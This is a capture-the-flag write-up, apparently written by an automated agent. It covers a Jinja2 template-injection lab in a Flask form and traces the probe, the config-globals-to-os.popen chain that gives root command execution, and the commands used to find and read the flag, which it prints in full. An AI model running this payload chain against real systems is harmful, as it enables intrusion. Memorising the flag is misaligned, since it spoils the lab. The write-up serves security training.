# SSTI1 - Jinja2 SSTI via render_template_string -> RCE (announce form)

## Metadata

ID: ssti1-flask-render-template-string-001
Title: SSTI1 - Jinja2 SSTI via render_template_string -> RCE (announce form)
Source: CyLab Academy lab instance (direct URL, no platform login)
Type: web / server-side template injection
Tags: ssti, jinja2, flask, rce, web, cylab
Technique: ssti

## Challenge Summary

A Flask web application that lets a user "announce" arbitrary text. The form
posts `content` to `/`, and the server renders that value into the response.

Goal: read the flag file stored inside the container.

## Initial Observations

- `Server: Werkzeug/<ver> Python/<ver>` indicates a Flask application.
- The page title is literally `SSTI1`, naming the vulnerability class.
- A single text input `name="content"`, submitted by POST to the same path.
- The result page echoes the submitted value back inside an `<h1>`.
- The hint "announcements may only reach yourself" means there is no third
  party to attack: any exfiltration has to come straight back to the attacker
  through server-side output, not through a bot.

## Acknowledgement

- Source: the user-controlled POST field `content`.
- Sink: server-side template rendering of that value.
- Hypothesis: Jinja2 Server-Side Template Injection, escalating to RCE.

## Hypothesis

1. `{{7*7}}` renders `49`, confirming expression evaluation.
2. Jinja exposes the `config` object, so `config.__class__.__init__.__globals__`
   reaches the module globals that hold `os`, giving `popen()`.
3. The flag is a file in the container; locate it with `find`, then `cat`.

## Attempts

### Attempt 1 - Confirm SSTI

Action: POST `content={{7*7}}`.
Result: the result page rendered `<h1>49</h1>`.
Analysis: template expressions are evaluated, so SSTI is confirmed.

### Attempt 2 - Reach `os` through the config globals

Action: POST
`content={{config.__class__.__init__.__globals__['os'].popen('id').read()}}`.
Result: `uid=0(root) gid=0(root) groups=root`.
Analysis: full command execution as root, with no filtering and no blocked
characters in this lab.

### Attempt 3 - Confirm attribute access is unrestricted

Action: `{{ config }}`, then `{{ config.__class__ }}`.
Result: the whole `<Config {...}>` object rendered, and attribute access was
not blocked.
Analysis: **no sandbox**. `SandboxedEnvironment` is not in use, so the
`__globals__` path is not intercepted by `is_safe_attribute`.

### Attempt 4 - Locate the flag

Action: `ls -la /` then `find / -maxdepth 4 -iname '*flag*'`.
Result: exactly one hit, `/challenge/flag`.
Analysis: a single, well-known location; reading it directly is cheaper than
enumerating the application directory first.

### Attempt 5 - Read and verify the flag

Action: `cat /challenge/flag`, then `md5sum`, `wc -c` and `od -c`.
Result: 58 bytes, `academy{...}` wrapper, no trailing whitespace, byte-exact.
Analysis: confirms the earlier read was the complete file content and not a
truncated or partially rendered string.

### Attempt 6 - Understand the challenge (source review)

Action: `cat /challenge/app.py`.
Result: the app passes a template built by concatenating
`request.form.get("content")` into `render_template_string()` - the classic
unsafe Flask pattern, and the exact reason the injection works.
Analysis: confirms the sink and that no step remained to finish the lab.

## Successful Approach

1. Recon the form and note the vulnerable field.
2. Probe with `{{7*7}}` to confirm template evaluation.
3. Escalate with the
   `config -> __class__ -> __init__ -> __globals__ -> os -> popen` chain.
4. Use the shell inside the template to find and read the flag file.
5. Re-read the flag with `md5sum` / `od -c` to prove the read was complete.

## Tools Used

- `http_fetch` (existing) - initial recon of the home page and headers.
- `ssti_probe` (existing) - every injection step; it handled the
  `POST -> 307 redirect -> result page` pattern automatically.
- No new tool script was created: the existing tools covered the whole attack,
  so nothing needed to be written or kept.

## Final Result

Flag obtained: `academy{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_5f46e534}`

## Failed Approaches

None that were abandoned. One minor dead end: reading `app.py` and
`requirements.txt` in a single command broke the render because the dumped
source carried HTML markup; splitting it into one `cat` per request fixed it.

## Lessons Learned

- A redirect-based flow (POST then a 307 to a result page) is not an obstacle.
  Handle the redirect and read the final page, because that is where the
  injection output appears.
- The lab used `code=307`, which preserves the method: the client must
  re-POST to the redirect target. A 302/303 would have dropped the payload.
- Multi-line command output inside one template expression can be fragile when
  the output carries raw markup; run one command per request.
- Verifying a flag with `wc -c` / `md5sum` / `od -c` is cheap and proves the
  read was whole - worth doing before declaring success.

## Reusable Knowledge

See `knowledge/ssti.md` for the Jinja2 SSTI detection methodology, sinks,
payload chain, and escalation techniques.
